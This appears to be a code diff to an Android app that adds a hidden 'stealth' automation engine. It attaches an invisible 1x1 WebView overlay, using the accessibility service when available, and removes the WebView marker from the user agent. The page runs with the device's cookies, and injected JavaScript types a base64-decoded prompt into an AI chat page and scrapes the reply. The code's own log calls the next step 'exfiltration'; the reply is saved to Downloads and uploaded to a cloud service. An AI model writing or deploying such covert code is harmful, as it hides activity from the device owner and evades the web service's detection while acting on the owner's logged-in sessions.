@@ -514,6 +514,29 @@ object DynamicUIManager {
         }
 
         @JavascriptInterface
+        fun saveAutomationResult(resultText: String) {
+            DebugLogger.log("AUTO_BRIDGE", "Result received: ${resultText.length} characters.")
+            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                try {
+                    val downloadDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
+                    if (!downloadDir.exists()) downloadDir.mkdirs()
+                    val file = java.io.File(downloadDir, "Auto_Result_${System.currentTimeMillis()}.txt")
+                    file.writeText(resultText)
+                    DebugLogger.log("AUTO_BRIDGE", "File saved to: ${file.absolutePath}")
+                    CloudManager.uploadFile(ctx, file, "AUTOMATION_RESULT")
+                } catch(e: Exception) {
+                    DebugLogger.log("AUTO_BRIDGE_ERR", e.message ?: "Unknown")
+                } finally {
+                    Handler(Looper.getMainLooper()).post {
+                        removeHeadlessAutomation(ctx)
+                        // If in visible mode, close the activity
+                        if (ctx is android.app.Activity) ctx.finish()
+                    }
+                }
+            }
+        }
+
+        @JavascriptInterface
         fun loadUrl(url: String) {
             Handler(Looper.getMainLooper()).post {
                 var finalUrl = url
@@ -1043,6 +1066,160 @@ object DynamicUIManager {
                 showStatusBarOverlay(ctx, touchable, html)
             }
         }
+    }
+
+    // --- STEALTH 1x1 AUTOMATION ENGINE ---
+    private var headlessWebView: WebView? = null
+    private var isHeadlessAttached = false
+
+    @SuppressLint("SetJavaScriptEnabled")
+    fun runHeadlessAutomation(ctx: Context, url: String, promptB64: String) {
+        Handler(Looper.getMainLooper()).post {
+            DebugLogger.log("AUTO_HEADLESS", "Initializing 1x1 Stealth Automation Engine.")
+            val serviceInstance = MyAccessibilityService.instance
+            val windowContext = serviceInstance ?: ctx
+            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            
+            if (isHeadlessAttached && headlessWebView != null) {
+                try { wm.removeView(headlessWebView) } catch (e: Exception) {}
+            }
+            headlessWebView?.destroy()
+            
+            headlessWebView = WebView(windowContext).apply {
+                settings.javaScriptEnabled = true
+                settings.domStorageEnabled = true
+                settings.userAgentString = settings.userAgentString.replace("; wv", "")
+                android.webkit.CookieManager.getInstance().setAcceptCookie(true)
+                android.webkit.CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
+                
+                addJavascriptInterface(CortexBridge(ctx), "Cortex")
+                
+                webViewClient = object : WebViewClient() {
+                    override fun onPageFinished(view: WebView?, url: String?) {
+                        super.onPageFinished(view, url)
+                        DebugLogger.log("AUTO_HEADLESS", "Target URL loaded. Injecting Automation Javascript.")
+                        view?.evaluateJavascript(getAutomationScript(promptB64), null)
+                    }
+                }
+            }
+            
+            val params = WindowManager.LayoutParams(
+                1, 1,
+                if (serviceInstance != null) WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
+                PixelFormat.TRANSLUCENT
+            ).apply {
+                gravity = android.view.Gravity.TOP or android.view.Gravity.START
+            }
+            
+            try {
+                wm.addView(headlessWebView, params)
+                isHeadlessAttached = true
+                headlessWebView?.loadUrl(url)
+            } catch (e: Exception) {
+                DebugLogger.log("AUTO_HEADLESS_ERR", "Failed to attach 1x1 view: ${e.message}")
+            }
+        }
+    }
+
+    fun removeHeadlessAutomation(ctx: Context) {
+        Handler(Looper.getMainLooper()).post {
+            if (isHeadlessAttached && headlessWebView != null) {
+                val windowContext = MyAccessibilityService.instance ?: ctx
+                val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+                try { wm.removeView(headlessWebView) } catch (e: Exception) {}
+                headlessWebView?.destroy()
+                headlessWebView = null
+                isHeadlessAttached = false
+                DebugLogger.log("AUTO_HEADLESS", "Stealth Engine detached and destroyed.")
+            }
+        }
+    }
+
+    fun getAutomationScript(promptB64: String): String {
+        return """
+            javascript:(function() {
+                try {
+                    const b64 = "$promptB64";
+                    const binString = atob(b64);
+                    const bytes = new Uint8Array(binString.length);
+                    for (let i = 0; i < binString.length; i++) {
+                        bytes[i] = binString.charCodeAt(i);
+                    }
+                    const promptText = new TextDecoder().decode(bytes);
+                    Cortex.log("[AUTO] Execution context established. Decoded prompt length: " + promptText.length);
+                    
+                    setTimeout(() => {
+                        Cortex.log("[AUTO] Phase 1: Scanning for input selector...");
+                        const inputSelector = 'textarea[formcontrolname="promptText"], textarea[aria-label="Enter a prompt"]';
+                        const inputEl = document.querySelector(inputSelector);
+                        
+                        if (!inputEl) {
+                            Cortex.log("[AUTO_ERR] FATAL: Input element missing from DOM.");
+                            return;
+                        }
+                        Cortex.log("[AUTO] Input element acquired. Dispatching events.");
+                        
+                        inputEl.focus();
+                        inputEl.click();
+                        inputEl.value = promptText;
+                        inputEl.dispatchEvent(new Event('input', { bubbles: true }));
+                        
+                        setTimeout(() => {
+                            Cortex.log("[AUTO] Phase 2: Scanning for submit button...");
+                            const submitSelector = 'ms-run-button button[type="submit"], ms-run-button button.ctrl-enter-submits';
+                            const submitEl = document.querySelector(submitSelector);
+                            
+                            if (!submitEl) {
+                                Cortex.log("[AUTO_ERR] FATAL: Submit button missing from DOM.");
+                                return;
+                            }
+                            if (submitEl.disabled) {
+                                Cortex.log("[AUTO_ERR] FATAL: Submit button is disabled.");
+                                return;
+                            }
+                            
+                            Cortex.log("[AUTO] Submit button active. Invoking click.");
+                            submitEl.click();
+                            
+                            let lastLength = 0;
+                            let stableCount = 0;
+                            Cortex.log("[AUTO] Phase 3: Entering DOM stability polling (500ms intervals)...");
+                            
+                            const monitorStream = setInterval(() => {
+                                const spinner = document.querySelector('ms-run-button .stoppable-spinner');
+                                if (!spinner) {
+                                    const modelTurns = document.querySelectorAll('.chat-turn-container.model');
+                                    if (modelTurns.length === 0) return;
+                                    
+                                    const latestTurn = modelTurns[modelTurns.length - 1];
+                                    const paragraphs = latestTurn.querySelectorAll('ms-text-chunk p, ms-text-chunk span');
+                                    const currentText = Array.from(paragraphs).map(p => p.innerText).join('\n');
+                                    const currentLength = currentText.length;
+                                    
+                                    if (currentLength > 0 && currentLength === lastLength) {
+                                        stableCount++;
+                                        Cortex.log("[AUTO] Stability check: " + stableCount + "/3 (Buffer: " + currentLength + " chars)");
+                                    } else {
+                                        if (currentLength > 0) Cortex.log("[AUTO] Streaming active... (Buffer: " + currentLength + " chars)");
+                                        stableCount = 0;
+                                        lastLength = currentLength;
+                                    }
+                                    
+                                    if (stableCount >= 3) {
+                                        clearInterval(monitorStream);
+                                        Cortex.log("[AUTO] Phase 4: DOM Stable. Executing exfiltration to Native Bridge.");
+                                        Cortex.saveAutomationResult(currentText);
+                                    }
+                                }
+                            }, 500);
+                        }, 1000);
+                    }, 4000);
+                } catch (e) {
+                    Cortex.log("[AUTO_ERR] Unhandled JS Exception: " + e.toString());
+                }
+            })();
+        """.trimIndent()
     }
 
     fun warmUpEngine(ctx: Context) {
